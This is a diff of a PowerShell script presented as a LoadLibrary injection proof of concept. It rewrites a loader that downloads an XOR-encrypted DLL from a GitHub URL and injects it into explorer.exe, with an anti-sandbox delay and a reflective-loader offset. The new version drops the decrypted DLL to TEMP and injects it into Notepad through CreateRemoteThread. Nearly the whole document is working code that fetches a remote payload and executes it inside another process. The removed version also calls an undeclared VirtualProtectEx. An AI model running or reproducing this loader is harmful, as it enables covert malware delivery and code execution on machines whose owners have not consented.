@@ -1,112 +1,95 @@
+# InjectorLoadLibrary.ps1
+<#
+LoadLibrary Injection POC
+— Targets Notepad
+— Downloads an XOR’d DLL and drops it to disk
+— Calls LoadLibraryA remotely in Notepad
+#>
+
 #Requires -Version 3.0
 
-# Configuration
-$XOR_KEY = 0x71
-$DLL_URL = "https://raw.githubusercontent.com/Alon1123/Projects/main/stealth.enc"  # Replace with your URL
-$LOADER_OFFSET = 0x1000  # Adjust based on your DLL (objdump -x stealth.dll | grep ReflectiveLoader)
+### CONFIGURATION ###
+$XOR_KEY   = 0x71
+$DLL_URL   = "https://raw.githubusercontent.com/Alon1123/Projects/main/stealth.enc"
+$DLL_PATH  = "$env:TEMP\stealth.dll"    # where we’ll write the decrypted DLL
 
-# API Function Definitions
-$Win32 = @"
+### WIN32 IMPORTS ###
+$win32 = @"
 using System;
 using System.Runtime.InteropServices;
 public class Win32 {
-    [DllImport("kernel32")]
-    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
-    
-    [DllImport("kernel32")]
-    public static extern IntPtr VirtualAllocEx(
-        IntPtr hProcess, IntPtr address, uint size, uint type, uint protect
-    );
-    
-    [DllImport("kernel32")]
-    public static extern bool WriteProcessMemory(
-        IntPtr hProcess, IntPtr address, byte[] buffer, uint size, out IntPtr written
-    );
-    
-    [DllImport("kernel32")]
-    public static extern IntPtr CreateRemoteThread(
-        IntPtr hProcess, IntPtr attrs, uint stackSize, 
-        IntPtr startAddress, IntPtr param, uint flags, out IntPtr threadId
-    );
-    
-    [DllImport("kernel32")]
-    public static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);
+    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll",SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out IntPtr written);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string name);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr threadId);
+    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr handle);
 }
 "@
+Add-Type -TypeDefinition $win32 -Language CSharp
 
-# Compile API class in memory
-Add-Type -TypeDefinition $Win32 -Language CSharp
-
-# Anti-sandbox delay
-Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)
-
-# Get trusted process (explorer.exe)
-try {
-    $target = Get-Process -Name explorer -ErrorAction Stop
-    $pid = $target.Id
-} catch {
-    Write-Error "No explorer process found"
-    exit
-}
-
-# Download and decrypt DLL
-try {
-    $encrypted = (Invoke-WebRequest -Uri $DLL_URL -UseBasicParsing).Content
-    $dllBytes = [byte[]]::new($encrypted.Length)
-    for ($i=0; $i -lt $encrypted.Length; $i++) {
-        $dllBytes[$i] = $encrypted[$i] -bxor $XOR_KEY
+function Get-NotepadPID {
+    $name = "notepad"
+    try {
+        $p = Get-Process -Name $name -ErrorAction Stop | Select-Object -First 1
+    } catch {
+        Write-Host "[~] Notepad not running; launching..."
+        $p = Start-Process $name -PassThru
+        Start-Sleep -Milliseconds 500
     }
-} catch {
-    Write-Error "DLL download failed: $_"
-    exit
+    Write-Host "[+] Target Notepad PID: $($p.Id)"
+    return $p.Id
 }
 
-# Open target process
-$hProcess = [Win32]::OpenProcess(0x1F0FFF, $false, $pid)  # PROCESS_ALL_ACCESS
-if ($hProcess -eq [IntPtr]::Zero) {
-    Write-Error "OpenProcess failed (Error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
-    exit
+try {
+    # 1) Download & decrypt
+    Write-Host "[~] Downloading encrypted DLL..."
+    $enc = (Invoke-WebRequest -Uri $DLL_URL -UseBasicParsing).Content
+    $buf = [byte[]]::new($enc.Length)
+    for ($i=0; $i -lt $enc.Length; $i++) { $buf[$i] = $enc[$i] -bxor $XOR_KEY }
+
+    # 2) Write decrypted DLL to disk
+    Write-Host "[~] Writing DLL to $DLL_PATH"
+    [IO.File]::WriteAllBytes($DLL_PATH, $buf)
+
+    # 3) Pick and open target
+    $pid   = Get-NotepadPID
+    $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $pid)
+    if ($hProc -eq [IntPtr]::Zero) { throw "OpenProcess failed" }
+
+    try {
+        # 4) Allocate space for the DLL path string
+        $pathBytes = [Text.Encoding]::ASCII.GetBytes($DLL_PATH + "`0")
+        $len       = $pathBytes.Length
+        Write-Host "[~] Allocating $len bytes for path string..."
+        $remoteStr = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, $len, 0x3000, 0x04)
+        if ($remoteStr -eq [IntPtr]::Zero) { throw "VirtualAllocEx failed" }
+
+        # 5) Write the path string
+        Write-Host "[~] Writing path string..."
+        $written = [IntPtr]::Zero
+        $ok = [Win32]::WriteProcessMemory($hProc, $remoteStr, $pathBytes, $len, [ref]$written)
+        if (-not $ok -or $written -ne $len) { throw "WriteProcessMemory failed" }
+
+        # 6) Get LoadLibraryA addr
+        $hKernel = [Win32]::GetModuleHandle("kernel32.dll")
+        $addrLL  = [Win32]::GetProcAddress($hKernel, "LoadLibraryA")
+        Write-Host "[+] LoadLibraryA @ 0x{0:X}" -f $addrLL.ToInt64()
+
+        # 7) Create remote thread
+        Write-Host "[~] Spawning remote thread..."
+        $tid = [IntPtr]::Zero
+        $hth = [Win32]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $addrLL, $remoteStr, 0, [ref]$tid)
+        if ($hth -eq [IntPtr]::Zero) { throw "CreateRemoteThread failed" }
+        Write-Host "[+] Injection succeeded! Thread ID: $tid"
+
+        [Win32]::CloseHandle($hth) | Out-Null
+    }
+    finally { [Win32]::CloseHandle($hProc) | Out-Null }
+
+    Write-Host "[✓] Done — check Notepad for the MessageBox."
 }
-
-# Allocate memory (RW first, then RX)
-$memSize = $dllBytes.Length
-$remoteMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $memSize, 0x3000, 0x04)  # MEM_COMMIT|RESERVE, PAGE_READWRITE
-if ($remoteMem -eq [IntPtr]::Zero) {
-    Write-Error "VirtualAllocEx failed"
-    exit
+catch {
+    Write-Error "[!] Error: $_"
 }
-
-# Write DLL to target
-$written = [IntPtr]::Zero
-$success = [Win32]::WriteProcessMemory($hProcess, $remoteMem, $dllBytes, $memSize, [ref]$written)
-if (!$success -or $written -ne $memSize) {
-    Write-Error "WriteProcessMemory failed"
-    exit
-}
-
-# Change protection to RX
-$oldProtect = 0
-$vpSuccess = [Win32]::VirtualProtectEx($hProcess, $remoteMem, $memSize, 0x20, [ref]$oldProtect)  # PAGE_EXECUTE_READ
-if (!$vpSuccess) {
-    Write-Error "VirtualProtectEx failed"
-}
-
-# Calculate loader address
-$loaderAddr = [IntPtr]($remoteMem.ToInt64() + $LOADER_OFFSET)
-
-# Execute
-$threadId = [IntPtr]::Zero
-$hThread = [Win32]::CreateRemoteThread(
-    $hProcess, [IntPtr]::Zero, 0, $loaderAddr, [IntPtr]::Zero, 0, [ref]$threadId
-)
-
-if ($hThread -eq [IntPtr]::Zero) {
-    Write-Error "CreateRemoteThread failed"
-} else {
-    # Wait for execution
-    [Win32]::WaitForSingleObject($hThread, 5000) | Out-Null
-    Write-Host "[+] Injection successful! Thread ID: $($threadId)"
-}
-
-# Cleanup (optional)
-[Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($remoteMem)
